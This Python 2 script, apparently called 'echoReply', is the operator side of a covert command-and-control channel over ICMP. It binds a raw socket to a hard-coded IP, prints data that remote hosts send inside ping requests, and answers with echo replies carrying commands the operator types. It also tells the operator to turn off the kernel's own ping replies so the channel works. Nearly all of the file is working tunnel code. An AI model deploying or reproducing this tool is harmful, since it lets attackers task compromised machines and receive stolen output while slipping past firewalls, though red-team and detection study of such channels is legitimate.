#!/usr/bin/python

import time
import socket
import struct
import sys
import array
import threading


#    The linux kernel is setup to conduct an automatic echo reply.  How to disable it on linux is below...
#    To disable kernel ping replies, we added the following line to the /etc/sysctl.conf file: net.ipv4.icmp_echo_ignore_all=1 OR
# sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1


listeningIP = "64.137.165.77"

seqNumber = 1   # Sequence Number is Incremented every time a ping is sent...
setCommand = "blank"    # This is the message sent back for ICMP if nothing is set
ICMP_ECHOREPLY = 0		# Echo reply (per RFC792)
ICMP_ECHO = 8			# Echo request (per RFC792)
ICMP_MAX_RECV = 2048


#https://gist.github.com/pklaus/856268
#https://github.com/l4m3rx/python-ping/blob/master/ping.py

def default_timer():
    if sys.platform == "win32":
        return time.clock()
    else:
        return time.time()

def calcChecksum(source_string):
    """
    A port of the functionality of in_cksum() from ping.c
    Ideally this would act on the string as a series of 16-bit ints (host
    packed), but this works.
    Network data is big-endian, hosts are typically little-endian
    """
    if (len(source_string) % 2):
        source_string += "\x00"
    converted = array.array("H", source_string)
    if sys.byteorder == "big":
        converted.bytewap()
    val = sum(converted)
    val &= 0xffffffff # Truncate val to 32 bits (a variance from ping.c, which
                      # uses signed ints, but overflow is unlikely in ping)
    val = (val >> 16) + (val & 0xffff)    # Add high 16 bits to low 16 bits
    val += (val >> 16)                    # Add carry from above (if any)
    answer = ~val & 0xffff                # Invert and truncate to 16 bits
    answer = socket.htons(answer)
    return answer

def listenPing():
    global setCommand
    counter = 0
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.bind((listeningIP, 1))
    while True:
        try:
            data = s.recv(1024)
            ipHeader = data[:20]
            iphVersion, iphTypeOfSvc, iphLength, \
            iphID, iphFlags, iphTTL, iphProtocol, \
            iphChecksum, iphSrcIP, iphDestIP = struct.unpack(
                "!BBHHHBBHII", ipHeader
            )
            icmpHeader = data[20:28]
            icmpType, icmpCode, icmpChecksum, \
            icmpPacketID, icmpSeqNumber = struct.unpack(
                "!BBHHH", icmpHeader
            )
            srcIP = socket.inet_ntoa(struct.pack("!L", iphSrcIP))
            if str(data[28:32]) == '99zz':
                break
            else:
                if str(srcIP) != listeningIP and icmpType != 0:
                    print "SrcIP:" + str(srcIP) + " M:" + data[28:]
                    if (setCommand == "blank"):
                        echoReplyMessage = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                        returnTime = sendPingEchoReply(srcIP, echoReplyMessage, ICMP_ECHOREPLY, icmpPacketID, icmpSeqNumber)
                        #print "Echo Reply:" + str(srcIP) + " M:" + echoReplyMessage + "\n"
                    else:
                        echoReplyMessage = "c:" + setCommand
                        returnTime = sendPingEchoReply(srcIP, echoReplyMessage, ICMP_ECHOREPLY, icmpPacketID, icmpSeqNumber)
                        print "Echo Reply:" + str(srcIP) + " M:" + echoReplyMessage + "\n"
                        setCommand = "blank"
        except:
            print "\nUnable to listen for icmp packets...\n"
    s.close()



def sendPingEchoReply(destIP, replyMessage, proto, replayPacketID, replaySeqNumber): 
    try:
        sReply = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sReply.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except OSError as e:
        print("Failed with socket error: %s" % str(e))
        print("This requires root privileges...")
        raise
    
    currentMessage = replyMessage
    packetChecksum = 0
    icmpHeader = struct.pack("!BBHHH", proto, 0, packetChecksum, replayPacketID, replaySeqNumber)
    bytes = struct.calcsize("d")
    icmpData = currentMessage
    #icmpData = struct.pack("d", default_timer()) + icmpData
    packetChecksum = calcChecksum(icmpHeader + icmpData)
    # Reconstruct the header with the correct checksum...
    icmpHeader = struct.pack("!BBHHH", proto, 0, packetChecksum, replayPacketID, replaySeqNumber)
    icmpPacket = icmpHeader + icmpData
    sentTime = default_timer()
    try:
        sReply.sendto(icmpPacket, (destIP, 1))
    except OSError as e:
        print ("Failure to Send ICMP Packet %s" % str(e))
        return 0
    except:
        return 0
    # Increment the sequence number of the packet...
    #seqNumber += 1
    sReply.close()
    return sentTime




def sendPingEcho(destIP, destMessage, proto):
    global seqNumber
    from random import randint
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except OSError as e:
        print("Failed with socket error: %s" % str(e))
        print("This requires root privileges...")
        raise
    exitLoop = False
    while exitLoop == False:
        if len(destMessage) > 64:
            currentMessage = destMessage[:63]
            destMessage = destMessage[63:]
        else:
            currentMessage = destMessage
            exitLoop = True
        randomInt = randint(0,30000)
        packetID = (13927 ^ randomInt) & 0xFFFF
        packetChecksum = 0
        icmpHeader = struct.pack("!BBHHH", proto, 0, packetChecksum, packetID, seqNumber)
        bytes = struct.calcsize("d")
        icmpData = currentMessage
        #icmpData = struct.pack("d", default_timer()) + icmpData
        packetChecksum = calcChecksum(icmpHeader + icmpData)
        # Reconstruct the header with the correct checksum...
        icmpHeader = struct.pack("!BBHHH", proto, 0, packetChecksum, packetID, seqNumber)
        icmpPacket = icmpHeader + icmpData
        sentTime = default_timer()
        try:
            s.sendto(icmpPacket, (destIP, 1))
        except OSError as e:
            print ("Failure to Send ICMP Packet %s" % str(e))
            return 0
        except:
            return 0
        # Increment the sequence number of the packet...
        seqNumber += 1
    s.close()
    return sentTime

def main():
    global setCommand
    print
    print "echoReply is a python program that listens for an ICMP request and then"
    print "manipulated the response to contain a command or wait for additional results"
    print "of a command to be returned..."
    print
    print "Remember to modify the listeningIP at the beginning of the file..."
    print
    t = threading.Thread(target=listenPing)
    t.start()
    exitLoop = False
    while exitLoop == False:
        print "\n"
        selection = raw_input("Press C to set the command to send, Q to Quit\n")
        if selection == 'C' or selection == 'c':
            setCommand = raw_input("Command: ")
        elif selection == 'Q' or selection == 'q':
            # Unable to send a ICMP Echo Request with a properly configured firewall
            #sendPingEcho(listeningIP,'99zz', ICMP_ECHO)
            sys.exit(0)
        else:
            pass





if __name__ == '__main__':
    main()
